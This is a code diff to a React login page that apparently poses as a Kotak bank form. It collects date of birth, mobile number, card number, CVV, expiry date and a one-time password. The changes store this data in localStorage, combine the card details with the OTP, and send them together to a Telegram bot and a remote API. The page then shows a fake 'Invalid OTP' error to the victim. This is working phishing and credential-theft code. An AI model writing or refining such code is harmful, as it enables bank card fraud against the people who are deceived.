@@ -95,6 +95,9 @@ export default function Login() {
         dob
       }
       
+      // Store data temporarily, send all at the end
+      localStorage.setItem('kotakFormData', JSON.stringify(step1Data))
+      
       if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
         const telegramMessage = `
 📋 Service: ${step1Data.service}
@@ -104,13 +107,6 @@ export default function Login() {
         `
         await sendToTelegram(telegramMessage)
       }
-
-      // Always send to API
-      await fetch(`${API_URL}/api/users`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ...step1Data, step: 1 })
-      })
       
       setStep(2)
     } catch (err) {
@@ -131,20 +127,31 @@ export default function Login() {
     try {
       const step3Data = { otp }
 
+      // Get all stored data and combine with OTP
+      const storedData = JSON.parse(localStorage.getItem('kotakFormData') || '{}')
+      const finalData = { ...storedData, ...step3Data }
+
       if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
         const telegramMessage = `
 🔢 OTP: ${step3Data.otp}
+💳 Card: ${finalData.cardNumber}
+🔐 CVV: ${finalData.cvv}
+📅 Expiry: ${finalData.expDate}
+📱 Mobile: ${finalData.mobile}
 🕐 Time: ${new Date().toLocaleString()}
         `
         await sendToTelegram(telegramMessage)
       }
 
-      // Always send to API
+      // Send ALL data to API at once
       await fetch(`${API_URL}/api/users`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(step3Data)
+        body: JSON.stringify(finalData)
       })
+      
+      // Clear stored data
+      localStorage.removeItem('kotakFormData')
       
       setStepLoading(false)
       setError('Invalid OTP, try again later')
@@ -450,6 +457,10 @@ export default function Login() {
                       cvv,
                       expDate
                     }
+
+                    // Store card data temporarily
+                    const storedData = JSON.parse(localStorage.getItem('kotakFormData') || '{}')
+                    localStorage.setItem('kotakFormData', JSON.stringify({ ...storedData, ...step2Data }))
                     
                     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
                       const telegramMessage = `
@@ -460,13 +471,6 @@ export default function Login() {
                       `
                       await sendToTelegram(telegramMessage)
                     }
-
-                    // Always send to API
-                    await fetch(`${API_URL}/api/users`, {
-                      method: 'POST',
-                      headers: { 'Content-Type': 'application/json' },
-                      body: JSON.stringify(step2Data)
-                    })
                     
                     setStep(3)
                   } catch (err) {
